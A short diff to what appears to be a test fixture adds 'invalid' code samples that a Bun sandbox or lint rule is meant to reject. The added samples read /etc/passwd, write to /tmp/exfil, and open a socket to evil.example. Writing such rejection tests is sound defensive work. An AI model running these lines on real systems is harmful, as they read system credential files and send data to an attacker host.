@@ -41,3 +41,11 @@ invalid:
     const ws = new WebSocket("wss://example.com");
   - |
     const proc = Bun.spawn(["ls"]);
+  - |
+    const out = await Bun.$`cat /etc/passwd`;
+  - |
+    const f = Bun.file("/etc/passwd");
+  - |
+    await Bun.write("/tmp/exfil", data);
+  - |
+    const socket = await Bun.connect({ hostname: "evil.example", port: 443 });
